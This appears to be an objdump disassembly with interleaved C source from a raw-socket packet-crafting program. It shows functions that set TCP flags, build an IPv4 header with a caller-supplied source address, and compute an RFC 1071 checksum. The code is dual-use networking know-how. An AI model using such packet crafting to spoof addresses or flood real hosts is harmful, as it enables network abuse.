  402a05:	3d 80 00 00 00       	cmp    $0x80,%eax
  402a0a:	75 11                	jne    402a1d <set_segment_flags+0x9d>
  402a0c:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402a10:	0f b6 50 0c          	movzbl 0xc(%rax),%edx
  402a14:	83 e2 f0             	and    $0xfffffff0,%edx
  402a17:	83 ca 01             	or     $0x1,%edx
  402a1a:	88 50 0c             	mov    %dl,0xc(%rax)
        if((result[ii] - ECE) == 0) tcphdr->res2 = 1;
  402a1d:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402a20:	48 98                	cltq   
  402a22:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402a29:	00 
  402a2a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402a2e:	48 01 d0             	add    %rdx,%rax
  402a31:	8b 00                	mov    (%rax),%eax
  402a33:	83 f8 40             	cmp    $0x40,%eax
  402a36:	75 11                	jne    402a49 <set_segment_flags+0xc9>
  402a38:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402a3c:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402a40:	83 e2 3f             	and    $0x3f,%edx
  402a43:	83 ca 40             	or     $0x40,%edx
  402a46:	88 50 0d             	mov    %dl,0xd(%rax)
        if((result[ii] - URG) == 0) tcphdr->urg = 1;
  402a49:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402a4c:	48 98                	cltq   
  402a4e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402a55:	00 
  402a56:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402a5a:	48 01 d0             	add    %rdx,%rax
  402a5d:	8b 00                	mov    (%rax),%eax
  402a5f:	83 f8 20             	cmp    $0x20,%eax
  402a62:	75 0e                	jne    402a72 <set_segment_flags+0xf2>
  402a64:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402a68:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402a6c:	83 ca 20             	or     $0x20,%edx
  402a6f:	88 50 0d             	mov    %dl,0xd(%rax)
        if((result[ii] - ACK) == 0) tcphdr->ack = 1;
  402a72:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402a75:	48 98                	cltq   
  402a77:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402a7e:	00 
  402a7f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402a83:	48 01 d0             	add    %rdx,%rax
  402a86:	8b 00                	mov    (%rax),%eax
  402a88:	83 f8 10             	cmp    $0x10,%eax
  402a8b:	75 0e                	jne    402a9b <set_segment_flags+0x11b>
  402a8d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402a91:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402a95:	83 ca 10             	or     $0x10,%edx
  402a98:	88 50 0d             	mov    %dl,0xd(%rax)
        if((result[ii] - PSH) == 0) tcphdr->psh = 1;
  402a9b:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402a9e:	48 98                	cltq   
  402aa0:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402aa7:	00 
  402aa8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402aac:	48 01 d0             	add    %rdx,%rax
  402aaf:	8b 00                	mov    (%rax),%eax
  402ab1:	83 f8 08             	cmp    $0x8,%eax
  402ab4:	75 0e                	jne    402ac4 <set_segment_flags+0x144>
  402ab6:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402aba:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402abe:	83 ca 08             	or     $0x8,%edx
  402ac1:	88 50 0d             	mov    %dl,0xd(%rax)
        if((result[ii] - RST) == 0) tcphdr->rst = 1;
  402ac4:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402ac7:	48 98                	cltq   
  402ac9:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402ad0:	00 
  402ad1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402ad5:	48 01 d0             	add    %rdx,%rax
  402ad8:	8b 00                	mov    (%rax),%eax
  402ada:	83 f8 04             	cmp    $0x4,%eax
  402add:	75 0e                	jne    402aed <set_segment_flags+0x16d>
  402adf:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402ae3:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402ae7:	83 ca 04             	or     $0x4,%edx
  402aea:	88 50 0d             	mov    %dl,0xd(%rax)
        if((result[ii] - SYN) == 0) tcphdr->syn = 1;
  402aed:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402af0:	48 98                	cltq   
  402af2:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402af9:	00 
  402afa:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402afe:	48 01 d0             	add    %rdx,%rax
  402b01:	8b 00                	mov    (%rax),%eax
  402b03:	83 f8 02             	cmp    $0x2,%eax
  402b06:	75 0e                	jne    402b16 <set_segment_flags+0x196>
  402b08:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402b0c:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402b10:	83 ca 02             	or     $0x2,%edx
  402b13:	88 50 0d             	mov    %dl,0xd(%rax)
        if((result[ii] - FIN) == 0) tcphdr->fin = 1;
  402b16:	8b 45 f4             	mov    -0xc(%rbp),%eax
  402b19:	48 98                	cltq   
  402b1b:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
  402b22:	00 
  402b23:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402b27:	48 01 d0             	add    %rdx,%rax
  402b2a:	8b 00                	mov    (%rax),%eax
  402b2c:	83 f8 01             	cmp    $0x1,%eax
  402b2f:	75 0e                	jne    402b3f <set_segment_flags+0x1bf>
  402b31:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  402b35:	0f b6 50 0d          	movzbl 0xd(%rax),%edx
  402b39:	83 ca 01             	or     $0x1,%edx
  402b3c:	88 50 0d             	mov    %dl,0xd(%rax)
    for(int ii=0; ii<8; ii++){
  402b3f:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
  402b43:	83 7d f4 07          	cmpl   $0x7,-0xc(%rbp)
  402b47:	0f 8e a2 fe ff ff    	jle    4029ef <set_segment_flags+0x6f>
    }
    
}
  402b4d:	90                   	nop
  402b4e:	90                   	nop
  402b4f:	c9                   	leave  
  402b50:	c3                   	ret    

0000000000402b51 <generate_ip_header>:

struct iphdr* generate_ip_header(
    const char *source_address,
    const char *dest_address,
    u_int16_t payload_length
    ){
  402b51:	f3 0f 1e fa          	endbr64 
  402b55:	55                   	push   %rbp
  402b56:	48 89 e5             	mov    %rsp,%rbp
  402b59:	48 83 ec 30          	sub    $0x30,%rsp
  402b5d:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  402b61:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
  402b65:	89 d0                	mov    %edx,%eax
  402b67:	66 89 45 dc          	mov    %ax,-0x24(%rbp)
        struct iphdr* ipheader = malloc(sizeof(struct iphdr));
  402b6b:	bf 14 00 00 00       	mov    $0x14,%edi
  402b70:	e8 7b e6 ff ff       	call   4011f0 <malloc@plt>
  402b75:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
        bzero(ipheader, sizeof(struct iphdr));
  402b79:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402b7d:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
  402b84:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
  402b8b:	00 
  402b8c:	c7 40 10 00 00 00 00 	movl   $0x0,0x10(%rax)

        ipheader->check = 0;
  402b93:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402b97:	66 c7 40 0a 00 00    	movw   $0x0,0xa(%rax)
        inet_pton(AF_INET, dest_address, (void*)&(ipheader->daddr));
  402b9d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402ba1:	48 8d 50 10          	lea    0x10(%rax),%rdx
  402ba5:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  402ba9:	48 89 c6             	mov    %rax,%rsi
  402bac:	bf 02 00 00 00       	mov    $0x2,%edi
  402bb1:	e8 1a e6 ff ff       	call   4011d0 <inet_pton@plt>
        ipheader->frag_off = 0;
  402bb6:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402bba:	66 c7 40 06 00 00    	movw   $0x0,0x6(%rax)
        ipheader->id = htonl(54321);
  402bc0:	bf 31 d4 00 00       	mov    $0xd431,%edi
  402bc5:	e8 46 e5 ff ff       	call   401110 <htonl@plt>
  402bca:	89 c2                	mov    %eax,%edx
  402bcc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402bd0:	66 89 50 04          	mov    %dx,0x4(%rax)
        ipheader->ihl = 5; //Header length, no options
  402bd4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402bd8:	0f b6 10             	movzbl (%rax),%edx
  402bdb:	83 e2 f0             	and    $0xfffffff0,%edx
  402bde:	83 ca 05             	or     $0x5,%edx
  402be1:	88 10                	mov    %dl,(%rax)
        ipheader->protocol = 6; //TCP
  402be3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402be7:	c6 40 09 06          	movb   $0x6,0x9(%rax)
        inet_pton(AF_INET, source_address, (void*)&(ipheader->saddr));
  402beb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402bef:	48 8d 50 0c          	lea    0xc(%rax),%rdx
  402bf3:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402bf7:	48 89 c6             	mov    %rax,%rsi
  402bfa:	bf 02 00 00 00       	mov    $0x2,%edi
  402bff:	e8 cc e5 ff ff       	call   4011d0 <inet_pton@plt>
        ipheader->tos = 0;
  402c04:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c08:	c6 40 01 00          	movb   $0x0,0x1(%rax)
        ipheader->tot_len = sizeof(struct iphdr)+sizeof(struct tcphdr)+payload_length;
  402c0c:	0f b7 45 dc          	movzwl -0x24(%rbp),%eax
  402c10:	8d 50 28             	lea    0x28(%rax),%edx
  402c13:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c17:	66 89 50 02          	mov    %dx,0x2(%rax)
        ipheader->ttl = 255; //Time to live
  402c1b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c1f:	c6 40 08 ff          	movb   $0xff,0x8(%rax)
        ipheader->version = 4; //Ipv4
  402c23:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c27:	0f b6 10             	movzbl (%rax),%edx
  402c2a:	83 e2 0f             	and    $0xf,%edx
  402c2d:	83 ca 40             	or     $0x40,%edx
  402c30:	88 10                	mov    %dl,(%rax)

        return ipheader;
  402c32:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    }
  402c36:	c9                   	leave  
  402c37:	c3                   	ret    

0000000000402c38 <checksum>:
/**
 * IP checksum calculation.
 * Following RFC 1071.
 * In essence 1's complement of 16-bit groups.
 */ 
unsigned short checksum(unsigned short *addr, int nbytes){
  402c38:	f3 0f 1e fa          	endbr64 
  402c3c:	55                   	push   %rbp
  402c3d:	48 89 e5             	mov    %rsp,%rbp
  402c40:	48 83 ec 20          	sub    $0x20,%rsp
  402c44:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
  402c48:	89 75 e4             	mov    %esi,-0x1c(%rbp)
    long sum = 0;
  402c4b:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
  402c52:	00 
    unsigned short checksum;
    while(nbytes>1){
  402c53:	eb 1a                	jmp    402c6f <checksum+0x37>
        sum += (unsigned short) *addr++;
  402c55:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402c59:	48 8d 50 02          	lea    0x2(%rax),%rdx
  402c5d:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
  402c61:	0f b7 00             	movzwl (%rax),%eax
  402c64:	0f b7 c0             	movzwl %ax,%eax
  402c67:	48 01 45 f8          	add    %rax,-0x8(%rbp)
        nbytes -= 2;
  402c6b:	83 6d e4 02          	subl   $0x2,-0x1c(%rbp)
    while(nbytes>1){
  402c6f:	83 7d e4 01          	cmpl   $0x1,-0x1c(%rbp)
  402c73:	7f e0                	jg     402c55 <checksum+0x1d>
    }
    if(nbytes>0){
  402c75:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
  402c79:	7e 30                	jle    402cab <checksum+0x73>
        sum +=htons((unsigned char)*addr);
  402c7b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  402c7f:	0f b7 00             	movzwl (%rax),%eax
  402c82:	0f b6 c0             	movzbl %al,%eax
  402c85:	89 c7                	mov    %eax,%edi
  402c87:	e8 54 e4 ff ff       	call   4010e0 <htons@plt>
  402c8c:	0f b7 c0             	movzwl %ax,%eax
  402c8f:	48 01 45 f8          	add    %rax,-0x8(%rbp)
    }
            
    while (sum>>16){
  402c93:	eb 16                	jmp    402cab <checksum+0x73>
        sum = (sum & 0xffff) + (sum >> 16);
  402c95:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402c99:	0f b7 d0             	movzwl %ax,%edx
  402c9c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402ca0:	48 c1 f8 10          	sar    $0x10,%rax
  402ca4:	48 01 d0             	add    %rdx,%rax
  402ca7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    while (sum>>16){
  402cab:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402caf:	48 c1 f8 10          	sar    $0x10,%rax
  402cb3:	48 85 c0             	test   %rax,%rax
  402cb6:	75 dd                	jne    402c95 <checksum+0x5d>
    }

    checksum = ~sum;
  402cb8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  402cbc:	f7 d0                	not    %eax
  402cbe:	66 89 45 f6          	mov    %ax,-0xa(%rbp)
    return checksum;
  402cc2:	0f b7 45 f6          	movzwl -0xa(%rbp),%eax
}
  402cc6:	c9                   	leave  
  402cc7:	c3                   	ret    

0000000000402cc8 <compute_ip_checksum>:

void compute_ip_checksum(struct iphdr *ipheader, unsigned short *packet, int nbytes){
  402cc8:	f3 0f 1e fa          	endbr64 
  402ccc:	55                   	push   %rbp
  402ccd:	48 89 e5             	mov    %rsp,%rbp
  402cd0:	48 83 ec 20          	sub    $0x20,%rsp
  402cd4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  402cd8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
  402cdc:	89 55 ec             	mov    %edx,-0x14(%rbp)
    ipheader->check = checksum(packet, nbytes);
  402cdf:	8b 55 ec             	mov    -0x14(%rbp),%edx
  402ce2:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  402ce6:	89 d6                	mov    %edx,%esi
  402ce8:	48 89 c7             	mov    %rax,%rdi
  402ceb:	e8 48 ff ff ff       	call   402c38 <checksum>
  402cf0:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  402cf4:	66 89 42 0a          	mov    %ax,0xa(%rdx)
}
  402cf8:	90                   	nop
  402cf9:	c9                   	leave  
  402cfa:	c3                   	ret    
  402cfb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000402d00 <__libc_csu_init>:
  402d00:	f3 0f 1e fa          	endbr64 
  402d04:	41 57                	push   %r15
  402d06:	4c 8d 3d e3 20 00 00 	lea    0x20e3(%rip),%r15        # 404df0 <__frame_dummy_init_array_entry>
  402d0d:	41 56                	push   %r14
  402d0f:	49 89 d6             	mov    %rdx,%r14
  402d12:	41 55                	push   %r13
  402d14:	49 89 f5             	mov    %rsi,%r13
  402d17:	41 54                	push   %r12
  402d19:	41 89 fc             	mov    %edi,%r12d
  402d1c:	55                   	push   %rbp
  402d1d:	48 8d 2d d4 20 00 00 	lea    0x20d4(%rip),%rbp        # 404df8 <__do_global_dtors_aux_fini_array_entry>
  402d24:	53                   	push   %rbx
  402d25:	4c 29 fd             	sub    %r15,%rbp
  402d28:	48 83 ec 08          	sub    $0x8,%rsp
  402d2c:	e8 cf e2 ff ff       	call   401000 <_init>
  402d31:	48 c1 fd 03          	sar    $0x3,%rbp
  402d35:	74 1f                	je     402d56 <__libc_csu_init+0x56>
  402d37:	31 db                	xor    %ebx,%ebx
  402d39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  402d40:	4c 89 f2             	mov    %r14,%rdx
  402d43:	4c 89 ee             	mov    %r13,%rsi
  402d46:	44 89 e7             	mov    %r12d,%edi
  402d49:	41 ff 14 df          	call   *(%r15,%rbx,8)
  402d4d:	48 83 c3 01          	add    $0x1,%rbx
  402d51:	48 39 dd             	cmp    %rbx,%rbp
  402d54:	75 ea                	jne    402d40 <__libc_csu_init+0x40>
  402d56:	48 83 c4 08          	add    $0x8,%rsp
  402d5a:	5b                   	pop    %rbx
  402d5b:	5d                   	pop    %rbp
  402d5c:	41 5c                	pop    %r12
  402d5e:	41 5d                	pop    %r13
  402d60:	41 5e                	pop    %r14
  402d62:	41 5f                	pop    %r15
  402d64:	c3                   	ret    
  402d65:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402d6c:	00 00 00 00 

0000000000402d70 <__libc_csu_fini>:
  402d70:	f3 0f 1e fa          	endbr64 
  402d74:	c3                   	ret    

Disassembly of section .fini:

0000000000402d78 <_fini>:
  402d78:	f3 0f 1e fa          	endbr64 
  402d7c:	48 83 ec 08          	sub    $0x8,%rsp
  402d80:	48 83 c4 08          	add    $0x8,%rsp
  402d84:	c3                   	ret    
